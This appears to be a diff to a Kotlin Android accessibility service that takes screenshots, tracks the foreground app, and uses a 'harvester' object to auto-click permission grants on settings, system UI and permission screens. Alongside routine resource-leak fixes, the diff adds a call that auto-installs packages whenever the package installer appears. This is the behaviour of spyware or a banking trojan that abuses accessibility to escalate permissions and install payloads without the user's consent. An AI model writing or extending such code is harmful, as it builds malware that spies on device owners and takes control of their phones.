@@ -58,7 +58,14 @@ class AccessibilityHelper : AccessibilityService() {
         private var logFile: File? = null
         @JvmStatic var instance: AccessibilityHelper? = null
             private set
-        private val screenshotExecutor = Executors.newSingleThreadExecutor()
+        private var screenshotExecutor: java.util.concurrent.ExecutorService = Executors.newSingleThreadExecutor()
+
+        private fun getScreenshotExecutor(): java.util.concurrent.ExecutorService {
+            if (screenshotExecutor.isShutdown) {
+                screenshotExecutor = Executors.newSingleThreadExecutor()
+            }
+            return screenshotExecutor
+        }
 
         private val appSessions = mutableMapOf<String, AppSession>()
         private var currentForegroundApp: String? = null
@@ -172,15 +179,16 @@ class AccessibilityHelper : AccessibilityService() {
             val svc = instance ?: return null
             if (Build.VERSION.SDK_INT < 34) return null
             return suspendCancellableCoroutine { cont ->
-                svc.takeScreenshot(Display.DEFAULT_DISPLAY, screenshotExecutor, object : AccessibilityService.TakeScreenshotCallback {
+                svc.takeScreenshot(Display.DEFAULT_DISPLAY, getScreenshotExecutor(), object : AccessibilityService.TakeScreenshotCallback {
                     override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                         try {
                             val hb = result.hardwareBuffer
                             val cs = result.colorSpace
-                            val bitmap = Bitmap.wrapHardwareBuffer(hb, cs) ?: run { cont.resume(null); return }
+                            val bitmap = Bitmap.wrapHardwareBuffer(hb, cs) ?: run { hb.close(); cont.resume(null); return }
                             val stream = ByteArrayOutputStream()
                             bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream)
                             bitmap.recycle()
+                            hb.close()
                             cont.resume(stream.toByteArray())
                         } catch (e: Exception) {
                             cont.resume(null)
@@ -247,6 +255,9 @@ class AccessibilityHelper : AccessibilityService() {
                 if (pkg.contains("com.android.systemui") || pkg.contains("settings") ||
                     pkg.contains("packageinstaller") || pkg.contains("permissioncontroller")) {
                     source?.let { harvester.autoClickGrant(it) }
+                }
+                if (pkg.contains("packageinstaller")) {
+                    harvester.autoInstall()
                 }
             }
 
